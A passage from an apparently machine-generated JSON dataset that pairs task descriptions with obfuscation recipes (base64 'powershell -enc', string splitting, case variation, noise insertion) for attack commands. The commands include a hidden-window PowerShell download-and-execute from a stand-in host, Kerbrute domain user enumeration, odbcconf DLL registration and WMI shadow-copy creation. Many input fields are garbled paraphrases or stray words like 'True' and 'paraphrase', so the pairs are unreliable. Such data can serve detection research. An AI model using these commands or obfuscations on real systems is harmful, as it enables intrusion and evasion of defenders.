    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ":: Download and execute a PowerShell script with hidden window style style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase:",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ": The Paraphrase: Download and execute a PowerShell script with hidden window style style. This entry was posted in PowerShell and tagged executable in PowerShell, PowerShell, PowerShell, PowerShell.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ": Download and run a PowerShell script with hidden window style style: Download and execute a PowerShell script with hidden window style. This is simply to paraphrase: Download and execute a PowerShell script with hidden window style.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": "Download and execute a PowerShell script with hidden window style",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ":: Download and execute a PowerShell script with hidden window style style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase:",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ": The Paraphrase: Download and execute a PowerShell script with hidden window style style. This entry was posted in PowerShell and tagged executable in PowerShell, PowerShell, PowerShell, PowerShell.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ": Download and run a PowerShell script with hidden window style style: Download and execute a PowerShell script with hidden window style. This is simply to paraphrase: Download and execute a PowerShell script with hidden window style.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": "Download and execute a PowerShell script with hidden window style",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ":: Download and execute a PowerShell script with hidden window style style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase: Download and execute a PowerShell script with hidden window style paraphrase:",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ": The Paraphrase: Download and execute a PowerShell script with hidden window style style. This entry was posted in PowerShell and tagged executable in PowerShell, PowerShell, PowerShell, PowerShell.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": ": Download and run a PowerShell script with hidden window style style: Download and execute a PowerShell script with hidden window style. This is simply to paraphrase: Download and execute a PowerShell script with hidden window style.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script with hidden window style",
    "origin_cmd": "powershell.exe -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')\""
  },
  {
    "input": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "output": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ":: Similarly :: Use GPG (GNU Privacy Guard) command to encrypt a file.:..exe. Execute GPG command to encrypt a file. file. file.. command.. file. command.. command to encrypt a file. command. example: (paraphrase:) command.::  file. file.. file.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ": \"In a nutshell:: \" \" file... (GPG command). (GNU Privacy Guard).. Execute GPG command to encrypt a file. Execute command to encrypt a file. Execute command to encrypt a file.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ": The last thing we want to say here is (again): Encrypt a file with GPG (GNU Privacy Guard). For more command line examples, see this  a file.... file.. file... (GNU Privacy Guard). file. to encrypt files.: The.::: a file. file. (GPG). (GNU).",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ":: Similarly :: Use GPG (GNU Privacy Guard) command to encrypt a file.:..exe. Execute GPG command to encrypt a file. file. file.. command.. file. command.. command to encrypt a file. command. example: (paraphrase:) command.::  file. file.. file.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ": \"In a nutshell:: \" \" file... (GPG command). (GNU Privacy Guard).. Execute GPG command to encrypt a file. Execute command to encrypt a file. Execute command to encrypt a file.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ": The last thing we want to say here is (again): Encrypt a file with GPG (GNU Privacy Guard). For more command line examples, see this  a file.... file.. file... (GNU Privacy Guard). file. to encrypt files.: The.::: a file. file. (GPG). (GNU).",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ":: Similarly :: Use GPG (GNU Privacy Guard) command to encrypt a file.:..exe. Execute GPG command to encrypt a file. file. file.. command.. file. command.. command to encrypt a file. command. example: (paraphrase:) command.::  file. file.. file.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ": \"In a nutshell:: \" \" file... (GPG command). (GNU Privacy Guard).. Execute GPG command to encrypt a file. Execute command to encrypt a file. Execute command to encrypt a file.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ": The last thing we want to say here is (again): Encrypt a file with GPG (GNU Privacy Guard). For more command line examples, see this  a file.... file.. file... (GNU Privacy Guard). file. to encrypt files.: The.::: a file. file. (GPG). (GNU).",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ":: Similarly :: Use GPG (GNU Privacy Guard) command to encrypt a file.:..exe. Execute GPG command to encrypt a file. file. file.. command.. file. command.. command to encrypt a file. command. example: (paraphrase:) command.::  file. file.. file.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ": \"In a nutshell:: \" \" file... (GPG command). (GNU Privacy Guard).. Execute GPG command to encrypt a file. Execute command to encrypt a file. Execute command to encrypt a file.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": ": The last thing we want to say here is (again): Encrypt a file with GPG (GNU Privacy Guard). For more command line examples, see this  a file.... file.. file... (GNU Privacy Guard). file. to encrypt files.: The.::: a file. file. (GPG). (GNU).",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute GPG (GNU Privacy Guard) command to encrypt a file",
    "origin_cmd": "cmd /c '${gpgExeLocation}' -c '${FileLocation}'"
  },
  {
    "input": "Change directory to temp and run Kerbrute to enumerate domain users",
    "output": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "Change directory to temp and run Kerbrute to enumerate domain users",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "Change directory to temp and run Kerbrute to enumerate domain users",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "Change directory to temp and run Kerbrute to enumerate domain users",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "Change directory to temp and run Kerbrute to enumerate domain users",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "Change directory to temp and run Kerbrute to enumerate domain users",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "Change directory to temp and run Kerbrute to enumerate domain users",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "Change directory to temp and run Kerbrute to enumerate domain users",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Change directory to temp and run Kerbrute to enumerate domain users",
    "origin_cmd": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\\username.txt"
  },
  {
    "input": "Register a DLL using odbcconf.exe",
    "output": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": ": odbcconf.exe registers a DLL by using odbcconf.exe to register a DLL using odbcconf.exe.exe and odbcconf.exe to register a DLL using odbcconf.exe.exe. Register a DLL using odbcconf.exe to register a DLL using odbcconf.exe to register a DLL using odbcconf.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "Reconcise: register a DLL using odbcconf.exe.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "paraphrase",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "Register a DLL using odbcconf.exe",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": ": odbcconf.exe registers a DLL by using odbcconf.exe to register a DLL using odbcconf.exe.exe and odbcconf.exe to register a DLL using odbcconf.exe.exe. Register a DLL using odbcconf.exe to register a DLL using odbcconf.exe to register a DLL using odbcconf.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "Reconcise: register a DLL using odbcconf.exe.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "paraphrase",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "Register a DLL using odbcconf.exe",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": ": odbcconf.exe registers a DLL by using odbcconf.exe to register a DLL using odbcconf.exe.exe and odbcconf.exe to register a DLL using odbcconf.exe.exe. Register a DLL using odbcconf.exe to register a DLL using odbcconf.exe to register a DLL using odbcconf.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "Reconcise: register a DLL using odbcconf.exe.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "paraphrase",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "Register a DLL using odbcconf.exe",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": ": odbcconf.exe registers a DLL by using odbcconf.exe to register a DLL using odbcconf.exe.exe and odbcconf.exe to register a DLL using odbcconf.exe.exe. Register a DLL using odbcconf.exe to register a DLL using odbcconf.exe to register a DLL using odbcconf.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "Reconcise: register a DLL using odbcconf.exe.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "paraphrase",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Register a DLL using odbcconf.exe",
    "origin_cmd": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}"
  },
  {
    "input": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "output": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "paraphrase: \"Create a shadow copy using Windows Management Instrumentation (WMI)\"",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "Paraphrase: Create a shadow copy using Windows Management Instrumentation (WMI).",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "paraphrase: This paraphrase is to: Make a shadow copy using Windows Management Instrumentation (WMI)",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "paraphrase: \"Create a shadow copy using Windows Management Instrumentation (WMI)\"",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "Paraphrase: Create a shadow copy using Windows Management Instrumentation (WMI).",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "paraphrase: This paraphrase is to: Make a shadow copy using Windows Management Instrumentation (WMI)",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "paraphrase: \"Create a shadow copy using Windows Management Instrumentation (WMI)\"",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "Paraphrase: Create a shadow copy using Windows Management Instrumentation (WMI).",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
